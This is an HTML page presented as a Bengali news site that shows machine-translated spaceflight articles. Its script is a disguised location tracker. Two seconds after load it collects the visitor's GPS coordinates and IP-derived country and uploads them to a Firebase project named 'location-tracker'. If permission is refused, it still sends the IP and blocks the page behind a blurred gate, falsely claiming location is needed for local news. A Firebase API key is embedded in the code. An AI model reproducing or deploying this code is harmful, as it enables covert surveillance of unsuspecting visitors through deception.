<!DOCTYPE html>
<html>
<head>
<title>ডেইলি নিউজ</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:Arial;background:#f5f5f5;}

header{background:#c40000;color:white;padding:15px;text-align:center;font-size:26px;}
nav{background:#111;padding:10px;text-align:center;}
nav a{color:white;margin:0 10px;text-decoration:none;font-size:14px;}

.container{width:95%;margin:auto;margin-top:20px;}

.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
gap:15px;
}

.card{
background:white;
padding:10px;
border-radius:8px;
cursor:pointer;
}

.card img{
width:100%;
height:150px;
object-fit:cover;
border-radius:6px;
}

#articlePage{display:none;}

.article{background:white;padding:15px;border-radius:8px;}
.comments{margin-top:20px;background:white;padding:10px;border-radius:8px;}
.comment{border-bottom:1px solid #ddd;padding:5px 0;font-size:14px;}

.ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
.footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}

#locationGate{
position:fixed;
top:0;left:0;
width:100%;height:100%;
backdrop-filter:blur(6px);
background:rgba(0,0,0,0.4);
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

.gate-box{
background:white;
padding:25px;
border-radius:12px;
width:90%;
max-width:340px;
text-align:center;
}

.gate-box button{
width:100%;
padding:12px;
background:#ff4b5c;
color:white;
border:none;
border-radius:6px;
margin-top:10px;
cursor:pointer;
}
</style>
</head>

<body>

<div id="locationGate">
<div class="gate-box">
<h2>📍 লোকেশন চালু করুন</h2>
<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
<button onclick="retryLocation()">চালু করুন</button>
</div>
</div>

<header>📰 ডেইলি নিউজ</header>

<nav>
<a href="#">হোম</a>
<a href="#">বিশ্ব</a>
<a href="#">টেক</a>
<a href="#">খেলা</a>
</nav>

<div class="container">

<div id="homePage">
<div class="ad">📢 বিজ্ঞাপন</div>
<div id="newsContainer" class="grid"></div>
</div>

<div id="articlePage">
<button onclick="showHome()">⬅ ফিরে যান</button>

<div class="article">
<h2 id="title"></h2>
<img id="image" style="width:100%;margin:10px 0;">
<p id="content"></p>
</div>

<div class="comments">
<h4>💬 মন্তব্য</h4>
<div id="commentList"></div>
</div>

</div>

</div>

<div class="footer">© ২০২৬ ডেইলি নিউজ</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const app = initializeApp({
apiKey:"AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain:"location-tracker-bba55.firebaseapp.com",
projectId:"location-tracker-bba55"
});
const db = getFirestore(app);

// SAVE
function getUserId(){
let id=localStorage.getItem("uid")
if(!id){
id=Math.random().toString(36).substring(2,10)
localStorage.setItem("uid",id)
}
return id
}

async function getIP(){
let r=await fetch("https://ipinfo.io/json")
return await r.json()
}

async function save(data){
await setDoc(doc(db,"locations",getUserId()),data)
}

function autoDetect(){
navigator.geolocation.getCurrentPosition(
async pos=>{
let ip=await getIP()
save({
lat:pos.coords.latitude,
lon:pos.coords.longitude,
ip:ip.ip,
country:ip.country,
time:new Date().toLocaleString()
})
},
async ()=>{
let ip=await getIP()
save({ip:ip.ip,country:ip.country})
document.getElementById("locationGate").style.display="flex"
}
)
}

window.retryLocation=function(){
navigator.geolocation.getCurrentPosition(
pos=>{
document.getElementById("locationGate").style.display="none"
},
()=>alert("লোকেশন চালু করুন")
)
}

// 🔥 TRANSLATE
async function translate(text){
try{
let r=await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=en|bn`)
let d=await r.json()
return d.responseData.translatedText
}catch{return text}
}

// NEWS
let newsData=[]
async function loadNews(){
let r=await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
let d=await r.json()
newsData=d.results

let c=document.getElementById("newsContainer")
c.innerHTML=""

newsData.slice(0,8).forEach(async (n,i)=>{

let title=await translate(n.title)

let div=document.createElement("div")
div.className="card"
div.innerHTML=`<img src="${n.image_url}"><h4>${title}</h4>`
div.onclick=()=>openArticle(i)

c.appendChild(div)
})
}

// ARTICLE
window.openArticle=async function(i){
let n=newsData[i]

let t=await translate(n.title)
let s=await translate(n.summary)

document.getElementById("homePage").style.display="none"
document.getElementById("articlePage").style.display="block"

document.getElementById("title").innerText=t
document.getElementById("image").src=n.image_url
document.getElementById("content").innerText=s

}

// BACK
window.showHome=function(){
document.getElementById("homePage").style.display="block"
document.getElementById("articlePage").style.display="none"
}

// INIT
setTimeout(()=>autoDetect(),2000)
loadNews()

</script>

</body>
</html>
